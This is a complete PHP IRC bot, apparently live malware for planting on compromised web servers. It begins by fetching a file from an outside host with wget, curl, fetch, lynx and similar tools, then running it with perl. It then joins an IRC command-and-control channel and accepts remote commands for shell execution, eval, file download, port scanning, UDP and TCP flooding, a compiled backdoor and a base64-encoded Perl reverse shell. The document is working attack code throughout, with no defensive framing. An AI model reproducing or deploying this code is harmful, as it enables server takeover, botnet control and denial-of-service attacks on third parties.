<?phpset_time_limit(0); error_reporting(0); $url[2] = "http://www.magdalenoimport.com/images/mode/javairc.jpg";$sfe[2] = "sess_54t4tyfg";exec(); shell_exec(); system(); passthru();exec("wget ".$url[2]." -O ".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");exec("fetch -O ".$sfe[2]." ".$url[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");exec("cUrl -O ".$sfe[2]." ".$url[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");exec("lynx -dump ".$url[2]." ".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");exec("GET ".$url[2].">".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");exec("lwp-download ".$url[2]." ".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");shell_exec("wget ".$url[2]." -O ".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");shell_exec("fetch -O ".$sfe[2]." ".$url[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");shell_exec("cUrl -O ".$sfe[2]." ".$url[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");shell_exec("lynx -dump ".$url[2]." ".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");shell_exec("GET ".$url[2].">".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");shell_exec("lwp-download ".$url[2]." ".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");system("wget ".$url[2]." -O ".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");system("fetch -O ".$sfe[2]." ".$url[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");system("cUrl -O ".$sfe[2]." ".$url[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");system("lynx -dump ".$url[2]." ".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");system("GET ".$url[2].">".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");system("lwp-download ".$url[2]." ".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");passthru("wget ".$url[2]." -O ".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");passthru("fetch -O ".$sfe[2]." ".$url[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");passthru("cUrl -O ".$sfe[2]." ".$url[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");passthru("lynx -dump ".$url[2]." ".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");passthru("GET ".$url[2].">".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");passthru("lwp-download ".$url[2]." ".$sfe[2]."; chmod 755 ".$sfe[2]."; perl ".$sfe[2]."*");//-- /tmpexec("wget ".$url[2]." -O /tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");exec("fetch -O /tmp/".$sfe[2]." ".$url[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");exec("cUrl -O /tmp/".$sfe[2]." ".$url[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");exec("lynx -dump ".$url[2]." /tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");exec("GET ".$url[2].">/tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");exec("lwp-download ".$url[2]." /tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");shell_exec("wget ".$url[2]." -O /tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");shell_exec("fetch -O /tmp/".$sfe[2]." ".$url[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");shell_exec("cUrl -O /tmp/".$sfe[2]." ".$url[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");shell_exec("lynx -dump ".$url[2]." /tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");shell_exec("GET ".$url[2].">/tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");shell_exec("lwp-download ".$url[2]." /tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");system("wget ".$url[2]." -O /tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");system("fetch -O /tmp/".$sfe[2]." ".$url[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");system("cUrl -O /tmp/".$sfe[2]." ".$url[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");system("lynx -dump ".$url[2]." /tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");system("GET ".$url[2].">/tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");system("lwp-download ".$url[2]." /tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");passthru("wget ".$url[2]." -O /tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");passthru("fetch -O /tmp/".$sfe[2]." ".$url[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");passthru("cUrl -O /tmp/".$sfe[2]." ".$url[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");passthru("lynx -dump ".$url[2]." /tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");passthru("GET ".$url[2].">/tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");passthru("lwp-download ".$url[2]." /tmp/".$sfe[2]."; chmod 755 /tmp/".$sfe[2]."; perl /tmp/".$sfe[2]."*");//-- /var/tmpexec("wget ".$url[2]." -O /var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");exec("fetch -O /var/tmp/".$sfe[2]." ".$url[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");exec("cUrl -O /var/tmp/".$sfe[2]." ".$url[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");exec("lynx -dump ".$url[2]." /var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");exec("GET ".$url[2].">/var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");exec("lwp-download ".$url[2]." /var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");shell_exec("wget ".$url[2]." -O /var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");shell_exec("fetch -O /var/tmp/".$sfe[2]." ".$url[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");shell_exec("cUrl -O /var/tmp/".$sfe[2]." ".$url[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");shell_exec("lynx -dump ".$url[2]." /var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");shell_exec("GET ".$url[2].">/var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");shell_exec("lwp-download ".$url[2]." /var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");system("wget ".$url[2]." -O /var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");system("fetch -O /var/tmp/".$sfe[2]." ".$url[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");system("cUrl -O /var/tmp/".$sfe[2]." ".$url[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");system("lynx -dump ".$url[2]." /var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");system("GET ".$url[2].">/var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");system("lwp-download ".$url[2]." /var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");passthru("wget ".$url[2]." -O /var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");passthru("fetch -O /var/tmp/".$sfe[2]." ".$url[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");passthru("cUrl -O /var/tmp/".$sfe[2]." ".$url[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");passthru("lynx -dump ".$url[2]." /var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");passthru("GET ".$url[2].">/var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");passthru("lwp-download ".$url[2]." /var/tmp/".$sfe[2]."; chmod 755 /var/tmp/".$sfe[2]."; perl /var/tmp/".$sfe[2]."*");echo "ok!";class pBot { var $config = array("server"=>"irc.javairc.org",                     "port"=>"6667",                     "pass"=>"123",                     "prefix"=>"[ANAKBEGO]",                     "maxrand"=>"5",                     "chan"=>"#planet",                     "chan2"=>"#planet",                     "key"=>"x",                     "modes"=>"+p",                     "password"=>"123",                     "trigger"=>".",                     "hostauth"=>"sibego.users.javairc.org" // * for any hostname (remember: /setvhost pucorp.org)                     );                      var $users = array();  function start()  {     if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30)))        $this->start();     $ident = $this->config['prefix'];// $ident = $nicky[rand(0,count($nicky) - 1)];    $alph = range("0","9");    for($i=0;$i<$this->config['maxrand'];$i++)        #$ident .= $alph[rand(0,9)];    if(strlen($this->config['pass'])>0)        $this->send("PASS ".$this->config['pass']);    $this->send("USER ".$ident." 127.0.0.1 localhost :".php_uname()."");    $this->set_nick();    $this->main(); }  function main()  {     while(!feof($this->conn))     {        $this->buf = trim(fgets($this->conn,512));        $cmd = explode(" ",$this->buf);        if(substr($this->buf,0,6)=="PING :")        {           $this->send("PONG :".substr($this->buf,6));        }        if(isset($cmd[1]) && $cmd[1] =="001")        {           $this->send("MODE ".$this->nick." ".$this->config['modes']);           $this->send("JOIN ".$this->config['chan']." ".$this->config['key']."");          $this->join($this->config['chan'],$this->config['key']);       } 	   if(isset($cmd[1]) && $cmd[1] =="002")        {           if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "4ON"; }          else { $safemode = "9OFF"; }		  		  $usr = get_current_user();		  $usrn = "14".$usr."";		  		  if($usr == "root") { $usrn = "12".$usr.""; }		  if($usr == "SYSTEM") { $usrn = "12".$usr.""; }		 				  $mname = "14".php_uname()."";		  $url = "14http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."";		  $pth = "14".getcwd()."";		  			$pthh =  getcwd()."";            chmod($pthh, 0755);			$perms = fileperms("$pthh");		if (($perms & 0xC000) == 0xC000) { $info = 's';		} elseif (($perms & 0xA000) == 0xA000) { $info = 'l';		} elseif (($perms & 0x8000) == 0x8000) { $info = '-';		} elseif (($perms & 0x6000) == 0x6000) { $info = 'b';		} elseif (($perms & 0x4000) == 0x4000) { $info = 'd';		} elseif (($perms & 0x2000) == 0x2000) { $info = 'c';		} elseif (($perms & 0x1000) == 0x1000) { $info = 'p';		} else { $info = 'u'; }		// Owner		$info .= (($perms & 0x0100) ? 'r' : '-');		$info .= (($perms & 0x0080) ? 'w' : '-');		$info .= (($perms & 0x0040) ?					(($perms & 0x0800) ? 's' : 'x' ) :					(($perms & 0x0800) ? 'S' : '-'));		// Group		$info .= (($perms & 0x0020) ? 'r' : '-');		$info .= (($perms & 0x0010) ? 'w' : '-');		$info .= (($perms & 0x0008) ?					(($perms & 0x0400) ? 's' : 'x' ) :					(($perms & 0x0400) ? 'S' : '-'));		// World		$info .= (($perms & 0x0004) ? 'r' : '-');		$info .= (($perms & 0x0002) ? 'w' : '-');		$info .= (($perms & 0x0001) ?					(($perms & 0x0200) ? 't' : 'x' ) :					(($perms & 0x0200) ? 'T' : '-'));								$rghts = "14".$info."";			      $this->send("JOIN ".$this->config['chan']." ".$this->config['key']."");          $this->join($this->config['chan'],$this->config['key']);		  $this->privmsg($this->config['chan'],"[usr:]: $usrn [uname:] $mname");		  $this->privmsg($this->config['chan'],"[SAFE:\2 $safemode\2]: $url [pwd:] $pth ($rghts)");		  	   }	   if(isset($cmd[1]) && $cmd[1] =="003")        { 	   	  $this->send("JOIN ".$this->config['chan']." ".$this->config['key']."");          $this->join($this->config['chan'],$this->config['key']);	   }   	   if(isset($cmd[1]) && $cmd[1] =="004")        { 	   	  $this->send("JOIN ".$this->config['chan']." ".$this->config['key']."");          $this->join($this->config['chan'],$this->config['key']);	   }	   if(isset($cmd[1]) && $cmd[1] =="005")        { 	   	  $this->send("JOIN ".$this->config['chan']." ".$this->config['key']."");          $this->join($this->config['chan'],$this->config['key']);	   }       if(isset($cmd[1]) && $cmd[1]=="433")        {           $this->set_nick();        }        if($this->buf != $old_buf)        {           $mcmd = array();           $msg = substr(strstr($this->buf," :"),2);           $msgcmd = explode(" ",$msg);           $nick = explode("!",$cmd[0]);           $vhost = explode("@",$nick[1]);           $vhost = $vhost[1];           $nick = substr($nick[0],1);           $host = $cmd[0];           if($msgcmd[0]==$this->nick)           {            for($i=0;$i<count($msgcmd);$i++)               $mcmd[$i] = $msgcmd[$i+1];           }           else           {            for($i=0;$i<count($msgcmd);$i++)               $mcmd[$i] = $msgcmd[$i];           }           if(count($cmd)>2)           {              switch($cmd[1])              {                 case "QUIT":                    if($this->is_logged_in($host))                    {                       $this->log_out($host);                    }                 break;                 case "PART":                    if($this->is_logged_in($host))                    {                       $this->log_out($host);                    }                 break;                 case "PRIVMSG":                    if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*"))                    {                       if(substr($mcmd[0],0,1)==".")                       {                          switch(substr($mcmd[0],1))                          {                             case "user":                               if($mcmd[1]==$this->config['password'])                               {                                  $this->log_in($host);                              }                               else                               {                                  $this->notice($this->config['chan'],"[\2Auth\2]: Senha errada $nick idiota!!");                              }                             break;                          }                       }                    }                    elseif($this->is_logged_in($host))                    {                       if(substr($mcmd[0],0,1)==".")                       {                          switch(substr($mcmd[0],1))                          {                             case "restart":                                $this->send("QUIT :restart commando from $nick");                               fclose($this->conn);                                $this->start();                             break;                             case "safe":                               if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")                               {                               $safemode = "on";                               }                               else {                               $safemode = "off";                               }                               $this->privmsg($this->config['chan'],"[\2safe mode\2]: ".$safemode."");                            break;							case "bdoor":                               if(isset($mcmd[1]))                                {                                   $this->backd($mcmd[1]);                               }                            break;                            case "conback":                               if(count($mcmd)>2)                               {                                  $this->conback($mcmd[1],$mcmd[2]);                               }                            break;                            case "dns":                                if(isset($mcmd[1]))                                {                                   $ip = explode(".",$mcmd[1]);                                   if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3]))                                   {                                      $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1]));                                   }                                   else                                   {                                      $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1]));                                   }                                }                             break;                             case "info":                            case "vunl":                               if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }                               else { $safemode = "off"; }                               $uname = php_uname();                               $this->privmsg($this->config['chan'],"[\2info\2]: $uname (safe: $safemode)");                               $this->privmsg($this->config['chan'],"[\2vuln\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");                            break;                            case "bot":                               $this->privmsg($this->config['chan'],"[\2bot\2]: phpbot 2.0 by; #hasnf.");                            break;                            case "uname":                               if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }                               else { $safemode = "off"; }                               $uname = php_uname();                               $this->privmsg($this->config['chan'],"[\2info\2]: $uname (safe: $safemode)");                            break;                            case "rndnick":                                $this->set_nick();                             break;                             case "raw":                               $this->send(strstr($msg,$mcmd[1]));                             break;                             case "eval":                              $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));                            break;			                case "sexec":                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);                                $exec = shell_exec($command);                                $ret = explode("\n",$exec);                                for($i=0;$i<count($ret);$i++)                                   if($ret[$i]!=NULL)                                      $this->privmsg($this->config['chan'],"      : ".trim($ret[$i]));                             break;                             case "exec":                                $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);                                $exec = exec($command);                                $ret = explode("\n",$exec);                                for($i=0;$i<count($ret);$i++)                                   if($ret[$i]!=NULL)                                      $this->privmsg($this->config['chan'],"      : ".trim($ret[$i]));                             break;                             case "passthru":                                $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);                                $exec = passthru($command);                                $ret = explode("\n",$exec);                                for($i=0;$i<count($ret);$i++)                                   if($ret[$i]!=NULL)                                      $this->privmsg($this->config['chan'],"      : ".trim($ret[$i]));                             break;                             case "popen":                                if(isset($mcmd[1]))                                {                                   $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);                                   $this->privmsg($this->config['chan'],"[\2popen\2]: $command");                                  $pipe = popen($command,"r");                                   while(!feof($pipe))                                   {                                      $pbuf = trim(fgets($pipe,512));                                      if($pbuf != NULL)                                         $this->privmsg($this->config['chan'],"     : $pbuf");                                   }                                   pclose($pipe);                                }  			                               case "system":                                $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);                                $exec = system($command);                                $ret = explode("\n",$exec);                                for($i=0;$i<count($ret);$i++)                                   if($ret[$i]!=NULL)                                      $this->privmsg($this->config['chan'],"      : ".trim($ret[$i]));                             break;                             case "pscan": // .pscan 127.0.0.1 6667                                if(count($mcmd) > 2)                                {                                   if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15))                                      $this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2open\2");                                   else                                      $this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2closed\2");                                }                             break;                             case "ud.server": // .ud.server <server> <port> [password]                                if(count($mcmd)>2)                                {                                   $this->config['server'] = $mcmd[1];                                   $this->config['port'] = $mcmd[2];                                   if(isset($mcmcd[3]))                                   {                                    $this->config['pass'] = $mcmd[3];                                    $this->privmsg($this->config['chan'],"[\2update\2]: Server trocado para ".$mcmd[1].":".$mcmd[2]." Senha: ".$mcmd[3]);                                   }                                   else                                   {                                      $this->privmsg($this->config['chan'],"[\2update\2]: Server trocado para ".$mcmd[1].":".$mcmd[2]);                                   }                                }                             break;                             case "download":                                if(count($mcmd) > 2)                                {                                   if(!$fp = fopen($mcmd[2],"w"))                                   {                                      $this->privmsg($this->config['chan'],"[\2download\2]: Nao foi possivel fazer o download. Permissao negada.");                                   }                                   else                                   {                                      if(!$get = file($mcmd[1]))                                      {                                         $this->privmsg($this->config['chan'],"[\2download\2]: Nao foi possivel fazer o download de \2".$mcmd[1]."\2");                                      }                                      else                                      {                                         for($i=0;$i<=count($get);$i++)                                         {                                            fwrite($fp,$get[$i]);                                         }                                         $this->privmsg($this->config['chan'],"[\2download\2]: Arquivo \2".$mcmd[1]."\2 baixado para \2".$mcmd[2]."\2");                                      }                                      fclose($fp);                                   }                                }                               else { $this->privmsg($this->config['chan'],"[\2download\2]: use .download http://your.host/file /tmp/file"); }                            break;                             case "die":                                $this->send("QUIT :die command from $nick");                               fclose($this->conn);                                exit;                             case "logout":                                $this->log_out($host);                                $this->privmsg($this->config['chan'],"[\2auth\2]: $nick deslogado!");                             break;                             case "udpflood":                                if(count($mcmd)>3)                                {                                   $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]);                                }                             break;                             case "tcpflood":                                if(count($mcmd)>5)                                {                                   $this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]);                                }                             break;                          }                       }                    }                 break;              }           }        }        $old_buf = $this->buf;     }     $this->start();  }  function send($msg)  {     fwrite($this->conn,"$msg\r\n");  }  function join($chan,$key=NULL)  {     $this->send("JOIN $chan $key");  }  function privmsg($to,$msg) {    $this->send("PRIVMSG $to :$msg"); } function notice($to,$msg) {    $this->send("NOTICE $to :$msg"); } function is_logged_in($host)  {     if(isset($this->users[$host]))        return 1;     else        return 0;  }  function log_in($host)  {     $this->users[$host] = true;  }  function log_out($host)  {     unset($this->users[$host]);  }  function set_nick() {$querym=array("?", "!", "^^", " ^^", " :("," :)", " ~:>", " :P~", " :D", ".", "a", "i", "u", "e", "o","z", "v", "z", "x", "c", "p", "m", "t", "k", "b", "s", "u", "bot", "g", "lo", "jo", "lol");$tsu1=array("`","|","[","]","{","}","^","_");$tsu2=array("`","|","[","]","{","}","^","-","\\","_");$nicky=array("IbLiz[sibego]");$usr1=array("IbLiZ");  $this->nick = $nicky[rand(0,count($nicky) - 1)];    #$this->nick .= $this->config['prefix'];     for($i=0;$i<$this->config['maxrand'];$i++)       # $this->nick .= mt_rand(0,9);     $this->send("NICK [".rand(100, 9999)."]".$this->nick); }   function udpflood($host,$packetsize,$time) {	$this->privmsg($this->config['chan'],"[\2UdpFlood Started!\2]"); 	$packet = "";	for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }	$timei = time();	$i = 0;	while(time()-$timei < $time) {		$fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);      	fwrite($fp,$packet);       	fclose($fp);		$i++;	}	$env = $i * $packetsize;	$env = $env / 1048576;	$vel = $env / $time;	$vel = round($vel);	$env = round($env);	$this->privmsg($this->config['chan'],"[\2UdpFlood Finished!\2]: $env MB enviados / Media: $vel MB/s ");} function tcpflood($host,$packets,$packetsize,$port,$delay)  {     $this->privmsg($this->config['chan'],"[\2TcpFlood Started!\2]");     $packet = "";     for($i=0;$i<$packetsize;$i++)        $packet .= chr(mt_rand(1,256));     for($i=0;$i<$packets;$i++)     {        if(!$fp=fsockopen("tcp://".$host,$port,$e,$s,5))        {           $this->privmsg($this->config['chan'],"[\2TcpFlood\2]: Error: <$e>");           return 0;        }        else        {           fwrite($fp,$packet);           fclose($fp);        }        sleep($delay);     }     $this->privmsg($this->config['chan'],"[\2TcpFlood Finished!\2]: Config - $packets pacotes para $host:$port.");  }  function cfb($fname,$text) {  $w_file=@fopen($fname,"w") or bberr();  if($w_file) {    @fputs($w_file,@base64_decode($text));    @fclose($w_file);  }}function bberr() { $this->privmsg($this->config['chan'],"[BDoor:]14 Error: Can't backdoor host!"); }			function backd($por){	$backdoor = "";				$ip = gethostbyname($_SERVER["HTTP_HOST"]);	$this->privmsg($this->config['chan'],"[BDoor:]14 starting backdoor.");	if (is_writable("/tmp"))    {      if (file_exists("/tmp/shbd")) { unlink("/tmp/shbd"); }      cfb("/tmp/shbd.c",$backdoor);	  passthru("gcc /tmp/shbd.c -o /tmp/shbd &");      ex("chmod 777 /tmp/shbd");		//$cmd = "./tmp/shbd $por";		$cmd = "./tmp/shbd";		exec("$cmd > /dev/null &");		$scan = myshellexec("ps aux");	  unlink("/tmp/shbd");    }    else	{	if (is_writable("/var/tmp"))    {      if (file_exists("/var/tmp/shbd")) { unlink("/var/tmp/shbd"); }      cfb("/var/tmp/shbd.c",$backdoor);	  passthru("gcc /var/tmp/shbd.c -o /var/tmp/shbd &");      ex("chmod 777 /var/tmp/shbd");		//$cmd = "./var/tmp/shbd $por";		$cmd = "./var/tmp/shbd";		exec("$cmd > /dev/null &");		$scan = myshellexec("ps aux");	  unlink("/var/tmp/shbd");    } 	if (is_writable("."))    {      if (file_exists("shbd")) { unlink("shbd"); }      cfb("shbd.c",$backdoor);	  passthru("gcc shbd.c -o shbd &");      ex("chmod 777 shbd");		//$cmd = "./shbd $por";		$cmd = "./shbd";		exec("$cmd > /dev/null &");		$scan = myshellexec("ps aux");	  unlink("shbd");    }	}	$this->privmsg($this->config['chan'],"[BDoor:]14 To connect, use netcat! Usage: nc $ip 9997");	if (eregi("./shbd $por",$scan)) {		$this->privmsg($this->config['chan'],"[BDoor:]14 Backdoor setup successfully.");	} else {		$this->privmsg($this->config['chan'],"[BDoor:]14 Process not found, backdoor setup failed!");	}}		  function conback($ip,$port) {    $this->privmsg($this->config['chan'],"[\2conback\2]: tentando conectando a $ip:$port");    $dc_source = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KcHJpbnQgIkRhdGEgQ2hhMHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQppZiAoISRBUkdWWzBdKSB7DQogIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogIGV4aXQoMSk7DQp9DQpwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KJGhvc3QgPSAkQVJHVlswXTsNCiRwb3J0ID0gODA7DQppZiAoJEFSR1ZbMV0pIHsNCiAgJHBvcnQgPSAkQVJHVlsxXTsNCn0NCnByaW50ICJbKl0gQ29ubmVjdGluZy4uLlxuIjsNCiRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3AnKSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0Kc29ja2V0KFNFUlZFUiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCm15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogIGRpZSgiVW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KfQ0KcHJpbnQgIlsqXSBTcGF3bmluZyBTaGVsbFxuIjsNCmlmICghZm9yayggKSkgew0KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOw0KICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERFUlIsIj4mU0VSVkVSIik7DQogIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow0KICBleGl0KDApOw0KfQ0KcHJpbnQgIlsqXSBEYXRhY2hlZFxuXG4iOw==";    if (is_writable("/tmp"))    {      if (file_exists("/tmp/dc.pl")) { unlink("/tmp/dc.pl"); }      $fp=fopen("/tmp/dc.pl","w");      fwrite($fp,base64_decode($dc_source));      passthru("perl /tmp/dc.pl $ip $port &");      unlink("/tmp/dc.pl");    }    else    {    if (is_writable("/var/tmp"))    {      if (file_exists("/var/tmp/dc.pl")) { unlink("/var/tmp/dc.pl"); }      $fp=fopen("/var/tmp/dc.pl","w");      fwrite($fp,base64_decode($dc_source));      passthru("perl /var/tmp/dc.pl $ip $port &");      unlink("/var/tmp/dc.pl");    }    if (is_writable("."))    {      if (file_exists("dc.pl")) { unlink("dc.pl"); }      $fp=fopen("dc.pl","w");      fwrite($fp,base64_decode($dc_source));      passthru("perl dc.pl $ip $port &");      unlink("dc.pl");    }    }  }} $bot = new pBot; $bot->start(); ?>